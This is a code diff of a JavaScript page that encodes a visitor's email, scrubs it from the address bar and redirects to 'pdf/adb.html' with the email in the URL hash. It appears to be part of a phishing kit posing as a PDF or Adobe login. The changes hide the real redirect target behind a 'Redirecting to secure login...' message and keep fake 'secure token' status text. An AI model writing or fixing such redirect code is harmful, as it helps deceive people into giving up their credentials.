@@ -263,12 +263,11 @@
       const token = generateSecureToken();
       updateStatus(processingStatus, 'Secure token generated successfully.');
       
-      // Encode data
+      // Encode data - FIXED FUNCTION
       function encodeData(data) {
-        return btoa(encodeURIComponent(data))
-          .replace(/\+/g, '-')
-          .replace(/\//g, '_')
-          .replace(/=+$/, '');
+        // Use the same encoding method as in adb.html
+        const base64 = btoa(encodeURIComponent(data));
+        return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
       }
       
       // Store in sessionStorage
@@ -279,12 +278,13 @@
       // Clean URL
       history.replaceState(null, "", window.location.pathname + window.location.search);
       
-      // Prepare redirect
+      // Prepare redirect - FIXED PATH
       const encodedEmail = encodeData(email);
-      const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
+      // Use the correct path to adb.html
+      const redirectUrl = `pdf/adb.html#${encodedEmail}`;
       
       updateStatus(processingStatus, 'Preparing secure redirect...');
-      updateStatus(redirectInfo, `Redirecting to: ${redirectUrl}`);
+      updateStatus(redirectInfo, `Redirecting to secure login...`);
       
       // Redirect with delay for user feedback
       setTimeout(() => {
